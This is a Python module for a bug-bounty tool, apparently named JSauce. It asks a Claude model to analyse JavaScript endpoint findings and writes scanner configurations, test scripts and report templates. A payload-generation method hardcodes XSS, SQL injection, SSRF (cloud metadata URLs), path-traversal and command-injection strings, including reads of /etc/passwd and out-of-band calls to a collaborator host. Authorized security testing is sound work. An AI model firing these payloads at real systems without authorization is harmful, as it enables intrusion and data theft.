import json
import os
import time
import random
from datetime import datetime
from typing import Dict, List, Optional, Any
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from src import config
from src.utils.Logger import get_logger

class AISecurityAnalyzer:
    """Bug bounty focused AI security analyzer for JSauce findings with robust rate limiting"""
    
    def __init__(self, banner, domain_handler, template_name, web_requests=None):
        self.banner = banner
        self.domain_handler = domain_handler
        self.template_name = template_name
        self.web_requests = web_requests
        self.logger = get_logger()
        
        # AI Configuration
        self.api_key = os.getenv('ANTHROPIC_API_KEY')
        self.api_url = 'https://api.anthropic.com/v1/messages'
        self.model = 'claude-opus-4-1-20250805'  # Updated to stable model
        self.max_tokens = 8000
        
        # Enhanced Rate Limiting Configuration
        self.base_delay = 3.0  # Base delay between requests (3 seconds)
        self.max_delay = 120.0  # Maximum delay (2 minutes)
        self.max_retries = 5  # Maximum retry attempts
        self.backoff_factor = 2.0  # Exponential backoff multiplier
        self.jitter_factor = 0.1  # Random jitter to avoid thundering herd
        
        # Request timeout configuration
        self.request_timeout = 180  # 3 minutes timeout
        
        # Bug bounty priority categories
        self.critical_bounty_categories = {
            'admin_endpoints', 'authentication_endpoints', 'api_keys_tokens',
            'payment_endpoints', 'oauth_endpoints', 'security_endpoints'
        }
        
        self.high_bounty_categories = {
            'api_endpoints', 'user_management', 'webhooks_callbacks',
            'file_operations', 'external_apis', 'command_execution_sinks'
        }
        
        # Configure robust HTTP session
        self.session = self._create_robust_session()
        
        self.logger.debug(f"Initialized AI Analyzer with enhanced rate limiting")
        self.logger.debug(f"Base delay: {self.base_delay}s, Max retries: {self.max_retries}")

    def _create_robust_session(self):
        """Create HTTP session with conservative retry strategy"""
        session = requests.Session()
        
        # Conservative retry strategy - don't retry 429s automatically
        retry_strategy = Retry(
            total=0,  # Don't auto-retry, we'll handle it manually
            status_forcelist=[500, 502, 503, 504],  # Only retry server errors
            backoff_factor=1,
            allowed_methods=["POST"]
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Set conservative timeout
        session.timeout = self.request_timeout
        
        return session

    def _calculate_delay(self, attempt: int, base_delay: float = None) -> float:
        """Calculate delay with exponential backoff and jitter"""
        if base_delay is None:
            base_delay = self.base_delay
            
        # Exponential backoff: base_delay * (backoff_factor ^ attempt)
        delay = base_delay * (self.backoff_factor ** attempt)
        
        # Add random jitter to prevent thundering herd
        jitter = random.uniform(-self.jitter_factor, self.jitter_factor) * delay
        delay_with_jitter = max(0.1, delay + jitter)
        
        # Cap at maximum delay
        final_delay = min(delay_with_jitter, self.max_delay)
        
        self.logger.debug(f"Calculated delay for attempt {attempt}: {final_delay:.2f}s")
        return final_delay

    def _handle_rate_limit(self, response: requests.Response, attempt: int) -> float:
        """Handle rate limit response and calculate appropriate delay"""
        if response.status_code == 429:
            # Check for Retry-After header
            retry_after = response.headers.get('Retry-After')
            if retry_after:
                try:
                    retry_delay = float(retry_after)
                    self.logger.warning(f"API returned Retry-After: {retry_delay}s")
                    # Add some buffer to the retry-after time
                    return min(retry_delay + 5.0, self.max_delay)
                except ValueError:
                    pass
            
            # Fallback to exponential backoff for 429s
            delay = self._calculate_delay(attempt, base_delay=10.0)  # Longer base delay for rate limits
            self.logger.warning(f"Rate limited (429), waiting {delay:.2f}s before retry")
            return delay
            
        elif response.status_code >= 500:
            # Server error - use normal exponential backoff
            delay = self._calculate_delay(attempt)
            self.logger.warning(f"Server error ({response.status_code}), waiting {delay:.2f}s before retry")
            return delay
            
        return 0.0

    def _make_api_request(self, payload: dict, domain: str) -> Optional[Dict]:
        """Make API request with robust retry logic and rate limiting"""
        headers = {
            'Content-Type': 'application/json',
            'X-API-Key': self.api_key,
            'anthropic-version': '2023-06-01'
        }
        
        last_error = None
        
        for attempt in range(self.max_retries + 1):
            try:
                if attempt > 0:
                    self.banner.add_status(f"Retrying AI analysis for {domain} (attempt {attempt + 1}/{self.max_retries + 1})", "warning")
                
                self.logger.debug(f"Making API request for {domain} (attempt {attempt + 1})")
                
                # Make the request
                response = self.session.post(
                    self.api_url, 
                    headers=headers, 
                    json=payload, 
                    timeout=self.request_timeout
                )
                
                # Success case
                if response.status_code == 200:
                    self.logger.success(f"API request successful for {domain}")
                    try:
                        result = response.json()
                        if 'content' in result and len(result['content']) > 0:
                            analysis_text = result['content'][0]['text']
                            return self._parse_bug_bounty_response(analysis_text)
                        else:
                            self.logger.error(f"Unexpected API response structure for {domain}")
                            return None
                    except (json.JSONDecodeError, KeyError, IndexError) as e:
                        self.logger.error(f"Error parsing API response for {domain}: {e}")
                        return None
                
                # Handle rate limiting and server errors
                elif response.status_code in [429, 500, 502, 503, 504]:
                    delay = self._handle_rate_limit(response, attempt)
                    
                    if attempt < self.max_retries:
                        self.banner.add_status(f"Waiting {delay:.1f}s before retry...", "warning")
                        time.sleep(delay)
                        continue
                    else:
                        last_error = f"Max retries exceeded. Last status: {response.status_code}"
                        self.logger.error(f"Max retries exceeded for {domain}. Final status: {response.status_code}")
                        break
                
                # Client errors (400s) - don't retry
                elif 400 <= response.status_code < 500:
                    error_msg = f"Client error {response.status_code} for {domain}"
                    try:
                        error_detail = response.json().get('error', {}).get('message', 'No details')
                        error_msg += f": {error_detail}"
                    except:
                        pass
                    
                    self.logger.error(error_msg)
                    last_error = error_msg
                    break
                    
                # Other errors
                else:
                    error_msg = f"Unexpected HTTP status {response.status_code} for {domain}"
                    self.logger.error(error_msg)
                    last_error = error_msg
                    
                    if attempt < self.max_retries:
                        delay = self._calculate_delay(attempt)
                        time.sleep(delay)
                        continue
                    else:
                        break
                        
            except requests.exceptions.Timeout as e:
                error_msg = f"Request timeout for {domain}: {e}"
                self.logger.error(error_msg)
                last_error = error_msg
                
                if attempt < self.max_retries:
                    delay = self._calculate_delay(attempt)
                    self.banner.add_status(f"Request timeout, waiting {delay:.1f}s...", "warning")
                    time.sleep(delay)
                    continue
                else:
                    break
                    
            except requests.exceptions.ConnectionError as e:
                error_msg = f"Connection error for {domain}: {e}"
                self.logger.error(error_msg)
                last_error = error_msg
                
                if attempt < self.max_retries:
                    delay = self._calculate_delay(attempt, base_delay=5.0)
                    self.banner.add_status(f"Connection error, waiting {delay:.1f}s...", "warning")
                    time.sleep(delay)
                    continue
                else:
                    break
                    
            except Exception as e:
                error_msg = f"Unexpected error for {domain}: {e}"
                self.logger.error(error_msg)
                last_error = error_msg
                
                if attempt < self.max_retries:
                    delay = self._calculate_delay(attempt)
                    time.sleep(delay)
                    continue
                else:
                    break
        
        # All retries exhausted
        self.logger.error(f"All retry attempts failed for {domain}. Last error: {last_error}")
        self.banner.add_status(f"AI analysis failed for {domain}: {last_error}", "error")
        return None

    def is_available(self) -> bool:
        """Check if AI analysis is available"""
        if not self.api_key:
            return False
        try:
            # Simple connectivity test with short timeout
            response = requests.get('https://api.anthropic.com', timeout=5)
            return True
        except:
            return False

    def analyze_findings(self, urls: List[str]) -> bool:
        """Analyze findings for bug bounty hunting with improved rate limiting"""
        if not self.is_available():
            self.banner.show_warning("AI analysis unavailable - set ANTHROPIC_API_KEY environment variable")
            return False

        self.logger.info("Starting AI Analysis with enhanced rate limiting")
        self.banner.add_status("STARTING AI SECURITY ANALYSIS...")
        
        analyzed_count = 0
        failed_count = 0
        
        # Add delay before starting to be respectful to the API
        initial_delay = self._calculate_delay(0)
        self.banner.add_status(f"Initializing AI analysis (waiting {initial_delay:.1f}s)...", "info")
        time.sleep(initial_delay)
        
        for i, url in enumerate(urls):
            domain = self.domain_handler.extract_domain(url)
            if not domain:
                continue
                
            findings = self._load_domain_findings(domain)
            if not findings:
                self.logger.debug(f"No findings to analyze for {domain}")
                continue
            
            try:
                self.banner.add_status(f"AI analyzing {domain} ({i+1}/{len(urls)})...")
                self.logger.info(f"Starting AI analysis for {domain}")
                
                # Build the analysis request
                prompt = self._build_bug_bounty_prompt(domain, findings)
                payload = {
                    'model': self.model,
                    'max_tokens': self.max_tokens,
                    'messages': [{'role': 'user', 'content': prompt}]
                }
                
                # Make the API request with retries
                analysis = self._make_api_request(payload, domain)
                
                if analysis:
                    self._save_bug_bounty_analysis(domain, analysis)
                    self._generate_exploitation_toolkit(domain, analysis, findings)
                    analyzed_count += 1
                    
                    self.banner.add_status(f"✅ AI analysis completed for {domain}", "success")
                    self.logger.success(f"Successfully analyzed {domain}")
                else:
                    failed_count += 1
                    self.banner.add_status(f"❌ AI analysis failed for {domain}", "error")
                    self.logger.error(f"Failed to analyze {domain}")
                    
            except Exception as e:
                failed_count += 1
                error_msg = f"AI analysis failed for {domain}: {e}"
                self.logger.error(error_msg)
                self.banner.add_status(f"❌ {error_msg}", "error")
            
            # Add delay between requests to be respectful to the API
            if i < len(urls) - 1:  # Don't wait after the last request
                inter_request_delay = self._calculate_delay(0)  # Base delay between requests
                self.banner.add_status(f"Waiting {inter_request_delay:.1f}s before next analysis...", "info")
                self.logger.debug(f"Inter-request delay: {inter_request_delay:.1f}s")
                time.sleep(inter_request_delay)
        
        # Cleanup
        self.session.close()
        
        # Summary
        total_attempted = analyzed_count + failed_count
        if analyzed_count > 0:
            self.banner.show_success(f"AI analysis completed: {analyzed_count}/{total_attempted} domains analyzed")
            self.logger.success(f"AI analysis summary: {analyzed_count} successful, {failed_count} failed")
        else:
            self.banner.show_warning(f"No AI analyses completed successfully ({failed_count} failed)")
            self.logger.warning(f"No successful AI analyses. {failed_count} domains failed")
        
        return analyzed_count > 0

    # ... (rest of the methods remain the same as the original implementation)
    # _load_domain_findings, _build_bug_bounty_prompt, _parse_bug_bounty_response, etc.
    
    def _load_domain_findings(self, domain: str) -> Optional[Dict]:
        """Load security findings for domain"""
        detailed_file = f"{config.OUTPUT_DIR}/{domain}/{domain}_{self.template_name}_detailed.json"
        
        if not os.path.exists(detailed_file):
            return None
            
        try:
            with open(detailed_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            self.logger.error(f"Error loading findings for {domain}: {e}")
            return None

    def _build_bug_bounty_prompt(self, domain: str, findings: Dict) -> str:
        """Build bug bounty focused analysis prompt"""
        contents_summary = findings.get('contents_summary', {})
        metadata = findings.get('metadata', {})
        total_endpoints = metadata.get('total_endpoints', 0)
        
        # Identify high-value targets
        high_value_findings = {}
        for category, endpoints in contents_summary.items():
            if category in self.critical_bounty_categories or category in self.high_bounty_categories:
                high_value_findings[category] = endpoints[:10]
        
        prompt = f"""You are an expert bug bounty hunter analyzing JavaScript findings for {domain}. 

DISCOVERED ENDPOINTS & PATTERNS:
- Total endpoints found: {total_endpoints}
- Security-relevant categories: {len(high_value_findings)}

HIGH-VALUE TARGETS:
{json.dumps(high_value_findings, indent=2)}

Please provide a comprehensive bug bounty analysis with these specific sections:

## 🎯 HIGHEST PRIORITY TARGETS
[Rank the top 5-7 most promising findings for bug bounty payouts. Include severity estimates (Critical/High/Medium) and why each is valuable]

## 🔍 TRUE POSITIVE VERIFICATION
[For each high-priority target, provide step-by-step instructions to verify if it's exploitable]

## 💰 EXPLOITATION TECHNIQUES
[Detailed attack vectors for each vulnerability type found with real-world payload examples]

## 🛠️ TESTING METHODOLOGY
[Practical testing approach with tools and techniques]

## 📝 BUG BOUNTY REPORTING
[How to write high-quality reports for maximum payout]

Focus on ACTIONABLE, PRACTICAL advice that leads to successful bug bounty submissions."""

        return prompt

    def _parse_bug_bounty_response(self, response_text: str) -> Dict:
        """Parse AI response into structured bug bounty analysis"""
        analysis = {
            'timestamp': datetime.now().isoformat(),
            'model_used': self.model,
            'raw_response': response_text,
            'sections': {},
            'priority_targets': [],
            'exploitation_techniques': [],
            'testing_methodology': []
        }
        
        # Split response into sections
        sections = response_text.split('##')
        for section in sections[1:]:
            lines = section.strip().split('\n', 1)
            if len(lines) >= 2:
                title = lines[0].strip()
                content = lines[1].strip()
                
                # Clean title for key
                clean_title = title.lower().replace('🎯', '').replace('🔍', '').replace('💰', '')
                clean_title = clean_title.replace('🛠️', '').replace('📝', '')
                clean_title = clean_title.strip().replace(' ', '_')
                
                analysis['sections'][clean_title] = content
        
        return analysis

    def _save_bug_bounty_analysis(self, domain: str, analysis: Dict):
        """Save bug bounty analysis results"""
        try:
            output_dir = f"{config.OUTPUT_DIR}/{domain}"
            os.makedirs(output_dir, exist_ok=True)
            
            # Save JSON analysis
            json_file = f"{output_dir}/{domain}_{self.template_name}_bug_bounty_analysis.json"
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump(analysis, f, indent=2, ensure_ascii=False)
            
            # Save readable markdown version
            md_file = f"{output_dir}/{domain}_{self.template_name}_bug_bounty_guide.md"
            with open(md_file, 'w', encoding='utf-8') as f:
                f.write(f"# 🎯 Bug Bounty Analysis for {domain}\n\n")
                f.write(f"**Generated:** {analysis['timestamp']}\n")
                f.write(f"**AI Model:** {analysis['model_used']}\n\n")
                f.write("---\n\n")
                f.write(analysis['raw_response'])
                f.write("\n\n---\n")
                f.write("*Generated by JSauce Bug Bounty AI Analyzer*\n")
            
            self.logger.success(f"Bug bounty analysis saved: {json_file}")
            
        except Exception as e:
            self.logger.error(f"Error saving bug bounty analysis for {domain}: {e}")

    def _generate_exploitation_toolkit(self, domain: str, analysis: Dict, findings: Dict):
        """Generate practical exploitation toolkit (placeholder - implement as needed)"""
        try:
            output_dir = f"{config.OUTPUT_DIR}/{domain}"
            os.makedirs(output_dir, exist_ok=True)
            
            # Create a simple exploitation notes file
            notes_file = f"{output_dir}/{domain}_{self.template_name}_exploitation_notes.txt"
            with open(notes_file, 'w', encoding='utf-8') as f:
                f.write(f"# Exploitation Notes for {domain}\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                f.write("## High Priority Targets:\n")
                
                # Extract priority targets from analysis
                sections = analysis.get('sections', {})
                priority_section = sections.get('highest_priority_targets', '')
                if priority_section:
                    f.write(priority_section)
                else:
                    f.write("See detailed analysis in the main report.\n")
            
            self.logger.debug(f"Exploitation notes saved: {notes_file}")
            
        except Exception as e:
            self.logger.error(f"Error generating exploitation toolkit for {domain}: {e}")

    def _generate_burp_project(self, domain: str, findings: Dict, output_dir: str):
        """Generate Burp Suite project configuration"""
        contents_summary = findings.get('contents_summary', {})
        
        # Build comprehensive Burp configuration
        burp_config = {
            "project": {
                "name": f"{domain}_bug_bounty_hunt",
                "description": f"Bug bounty testing project for {domain}",
                "created": datetime.now().isoformat()
            },
            "target": {
                "scope": {
                    "include": [
                        {"enabled": True, "url": f"https://{domain}"},
                        {"enabled": True, "url": f"http://{domain}"},
                        {"enabled": True, "url": f"https://*.{domain}"}
                    ]
                }
            },
            "scanner": {
                "live_scanning": {
                    "enabled": True,
                    "url_scope": "suite",
                    "insertion_points": [
                        "URL path parameters",
                        "Body parameters", 
                        "Cookies",
                        "HTTP headers"
                    ]
                },
                "crawl_and_audit": {
                    "crawl_strategy": "more_complete",
                    "audit_accuracy": "normal",
                    "audit_speed": "normal"
                }
            },
            "target_urls": [],
            "interesting_endpoints": {},
            "custom_headers": [
                {"name": "X-Forwarded-For", "value": "127.0.0.1"},
                {"name": "X-Real-IP", "value": "127.0.0.1"},
                {"name": "X-Originating-IP", "value": "127.0.0.1"}
            ]
        }
        
        # Add discovered endpoints by category
        for category, endpoints in contents_summary.items():
            category_urls = []
            for endpoint in endpoints[:15]:  # Limit for performance
                if endpoint.startswith('/'):
                    full_url = f"https://{domain}{endpoint}"
                    category_urls.append(full_url)
                    burp_config["target_urls"].append({
                        "url": full_url,
                        "category": category,
                        "method": "GET",
                        "priority": "high" if category in self.critical_bounty_categories else "medium"
                    })
            
            if category_urls:
                burp_config["interesting_endpoints"][category] = category_urls
        
        # Save Burp configuration
        burp_file = f"{output_dir}/{domain}_burp_project.json"
        with open(burp_file, 'w', encoding='utf-8') as f:
            json.dump(burp_config, f, indent=2)
        
        # Generate Burp macro/session handling rules
        burp_macros = {
            "macros": [
                {
                    "name": "Auth_Check",
                    "description": "Check if authentication is required",
                    "requests": [
                        {
                            "url": f"https://{domain}/admin",
                            "method": "GET",
                            "check_for": ["login", "unauthorized", "403", "401"]
                        }
                    ]
                }
            ],
            "session_handling": [
                {
                    "name": "Auto_Auth",
                    "description": "Automatically handle authentication",
                    "scope": f"https://{domain}/*"
                }
            ]
        }
        
        macro_file = f"{output_dir}/{domain}_burp_macros.json"
        with open(macro_file, 'w', encoding='utf-8') as f:
            json.dump(burp_macros, f, indent=2)

    def _generate_zap_context(self, domain: str, findings: Dict, output_dir: str):
        """Generate OWASP ZAP context file"""
        contents_summary = findings.get('contents_summary', {})
        
        zap_context = {
            "context": {
                "name": f"{domain}_bug_bounty",
                "description": f"Bug bounty context for {domain}",
                "includePaths": [
                    f"https://{domain}/.*",
                    f"http://{domain}/.*"
                ],
                "excludePaths": [
                    ".*/logout.*",
                    ".*/signout.*"
                ],
                "authentication": {
                    "type": "form",
                    "loginPageUrl": f"https://{domain}/login",
                    "loginRequestData": "username={username}&password={password}"
                },
                "users": [
                    {
                        "name": "test_user",
                        "credentials": {
                            "username": "test@example.com",
                            "password": "password123"
                        }
                    }
                ]
            },
            "spider": {
                "maxDepth": 10,
                "maxChildren": 100,
                "parseComments": True,
                "parseRobotsTxt": True,
                "handleODataParametersVisited": True
            },
            "activeScan": {
                "policy": "Custom_Bug_Bounty",
                "alertThreshold": "Low",
                "attackStrength": "High",
                "scanPolicyName": "Bug_Bounty_Policy"
            },
            "passiveScan": {
                "enabled": True,
                "scanOnlyInScope": True
            },
            "targets": []
        }
        
        # Add high-value targets
        for category, endpoints in contents_summary.items():
            if category in self.critical_bounty_categories:
                for endpoint in endpoints[:10]:
                    if endpoint.startswith('/'):
                        zap_context["targets"].append({
                            "url": f"https://{domain}{endpoint}",
                            "category": category,
                            "priority": "high",
                            "tests": ["xss", "sqli", "path_traversal", "ssrf"]
                        })
        
        zap_file = f"{output_dir}/{domain}_zap_context.json"
        with open(zap_file, 'w', encoding='utf-8') as f:
            json.dump(zap_context, f, indent=2)

    def _generate_payload_arsenal(self, domain: str, findings: Dict, output_dir: str):
        """Generate comprehensive payload collections"""
        contents_summary = findings.get('contents_summary', {})
        
        # XSS Payloads
        xss_payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            
            # Advanced XSS
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<video><source onerror=\"alert('XSS')\">",
            
            # Bypass techniques
            "'\"><script>alert('XSS')</script>",
            "\";alert('XSS');//",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            
            # DOM XSS
            "javascript:alert(document.domain)",
            "#<script>alert('XSS')</script>",
            "?search=<script>alert('XSS')</script>",
            
            # Filter bypasses
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E"
        ]
        
        # SQL Injection Payloads
        sqli_payloads = [
            # Basic SQLi
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            
            # Union-based
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT user(),version(),database()--",
            
            # Boolean-based
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT SUBSTRING(user(),1,1))='a'--",
            
            # Time-based
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            
            # Error-based
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
        
        # SSRF Payloads
        ssrf_payloads = [
            # Internal networks
            "http://127.0.0.1:80",
            "http://localhost:22",
            "http://0.0.0.0:80",
            "http://[::1]:80",
            
            # Cloud metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance",
            
            # Private IP ranges
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            
            # Protocol bypasses
            "file:///etc/passwd",
            "gopher://127.0.0.1:80",
            "dict://127.0.0.1:11211"
        ]
        
        # Path Traversal Payloads
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "../../../../../../etc/passwd%00",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....%2F....%2F....%2Fetc%2Fpasswd"
        ]
        
        # Command Injection Payloads
        command_payloads = [
            "; ls -la",
            "&& whoami",
            "| id",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; cat /etc/passwd",
            "&& cat /etc/passwd",
            "| cat /etc/passwd",
            "; ping -c 4 collaborator.com",
            "&& nslookup collaborator.com"
        ]
        
        # Save payload files
        payload_collections = {
            'xss': xss_payloads,
            'sqli': sqli_payloads,
            'ssrf': ssrf_payloads,
            'path_traversal': path_traversal_payloads,
            'command_injection': command_payloads
        }
        
        # Generate individual payload files
        for payload_type, payloads in payload_collections.items():
            payload_file = f"{output_dir}/{domain}_{payload_type}_payloads.txt"
            with open(payload_file, 'w', encoding='utf-8') as f:
                f.write(f"# {payload_type.upper()} Payloads for {domain}\n")
                f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                for payload in payloads:
                    f.write(f"{payload}\n")
        
        # Generate comprehensive payload file
        all_payloads_file = f"{output_dir}/{domain}_all_payloads.txt"
        with open(all_payloads_file, 'w', encoding='utf-8') as f:
            f.write(f"# Comprehensive Payload Arsenal for {domain}\n")
            f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            for payload_type, payloads in payload_collections.items():
                f.write(f"\n# {payload_type.upper()} PAYLOADS\n")
                f.write("# " + "="*50 + "\n")
                for payload in payloads:
                    f.write(f"{payload}\n")

    def _generate_testing_scripts(self, domain: str, findings: Dict, output_dir: str):
        """Generate automated testing scripts"""
        contents_summary = findings.get('contents_summary', {})
        
        # Generate Python testing script
        python_script = f'''#!/usr/bin/env python3
"""
Bug Bounty Testing Script for {domain}
Generated by JSauce AI Analyzer
"""

import requests
import time
import json
from urllib.parse import urljoin

class BugBountyTester:
    def __init__(self, domain):
        self.domain = domain
        self.base_url = f"https://{{domain}}"
        self.session = requests.Session()
        self.session.headers.update({{
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }})
        
    def test_endpoint(self, endpoint, method='GET', data=None):
        """Test a single endpoint"""
        url = urljoin(self.base_url, endpoint)
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, timeout=10)
            elif method.upper() == 'POST':
                response = self.session.post(url, data=data, timeout=10)
            
            return {{
                'url': url,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content_length': len(response.content),
                'response_time': response.elapsed.total_seconds()
            }}
        except Exception as e:
            return {{'url': url, 'error': str(e)}}
    
    def check_admin_endpoints(self):
        """Test for admin panel access"""
        admin_paths = [
'''

        # Add discovered admin endpoints
        if 'admin_endpoints' in contents_summary:
            for endpoint in contents_summary['admin_endpoints'][:10]:
                python_script += f"            '{endpoint}',\n"
        
        python_script += '''        ]
        
        results = []
        for path in admin_paths:
            result = self.test_endpoint(path)
            if result.get('status_code') == 200:
                print(f"[+] Potential admin access: {result['url']}")
            results.append(result)
            time.sleep(1)  # Rate limiting
        
        return results
    
    def check_api_endpoints(self):
        """Test API endpoints"""
        api_paths = [
'''

        # Add discovered API endpoints
        if 'api_endpoints' in contents_summary:
            for endpoint in contents_summary['api_endpoints'][:10]:
                python_script += f"            '{endpoint}',\n"
        
        python_script += '''        ]
        
        results = []
        for path in api_paths:
            result = self.test_endpoint(path)
            print(f"API endpoint {path}: {result.get('status_code', 'ERROR')}")
            results.append(result)
            time.sleep(1)
        
        return results

if __name__ == "__main__":
    tester = BugBountyTester("''' + domain + '''")
    
    print(f"Testing {domain} for bug bounty opportunities...")
    
    # Test admin endpoints
    admin_results = tester.check_admin_endpoints()
    
    # Test API endpoints
    api_results = tester.check_api_endpoints()
    
    print("Testing complete!")
'''

        script_file = f"{output_dir}/{domain}_testing_script.py"
        with open(script_file, 'w', encoding='utf-8') as f:
            f.write(python_script)
        
        # Make script executable
        os.chmod(script_file, 0o755)

    def _generate_report_templates(self, domain: str, analysis: Dict, output_dir: str):
        """Generate bug bounty report templates"""
        
        # HackerOne report template
        h1_template = f'''# Bug Report Template for {domain}

## Summary
**Vulnerability Type:** [XSS/SQLi/SSRF/etc.]
**Severity:** [Critical/High/Medium/Low]  
**Affected URL:** https://{domain}/[endpoint]

## Description
[Detailed description of the vulnerability]

## Steps to Reproduce
1. Navigate to https://{domain}/[endpoint]
2. [Step 2]
3. [Step 3]
4. Observe [expected result]

## Proof of Concept
```
[Include actual request/response or screenshots]
```

## Impact
[Explain the business impact and potential damage]

## Recommended Fix
[Provide specific remediation steps]

## Additional Information
- **Browser:** [Browser version]
- **Operating System:** [OS version]
- **Discovery Date:** {datetime.now().strftime('%Y-%m-%d')}
'''

        # Bugcrowd report template  
        bc_template = f'''# Vulnerability Report: {domain}

**Program:** {domain}
**Vulnerability Type:** [Category]
**Severity:** [P1/P2/P3/P4]
**Submission Date:** {datetime.now().strftime('%Y-%m-%d')}

## Executive Summary
[One-line summary of the issue]

## Vulnerability Details
**Affected Asset:** https://{domain}/[endpoint]
**Vulnerability Class:** [OWASP Category]
**Attack Vector:** [Remote/Local/Physical]

## Technical Details
[Technical explanation of the vulnerability]

## Reproduction Steps
1. [Step 1]
2. [Step 2] 
3. [Step 3]

## Evidence
[Screenshots, request/response data, etc.]

## Business Impact
[Explain real-world impact to the organization]

## Remediation
[Specific steps to fix the vulnerability]
'''

        # Save templates
        templates = {
            'hackerone': h1_template,
            'bugcrowd': bc_template
        }
        
        for platform, template in templates.items():
            template_file = f"{output_dir}/{domain}_{platform}_report_template.md"
            with open(template_file, 'w', encoding='utf-8') as f:
                f.write(template)

# Integration function for main application
def integrate_bug_bounty_ai(app_instance):
    """Integrate bug bounty AI analysis into JSauce"""
    app_instance.ai_analyzer = AISecurityAnalyzer(
        app_instance.banner,
        app_instance.domain_handler,
        app_instance.template_name,
        app_instance.web_requests
    )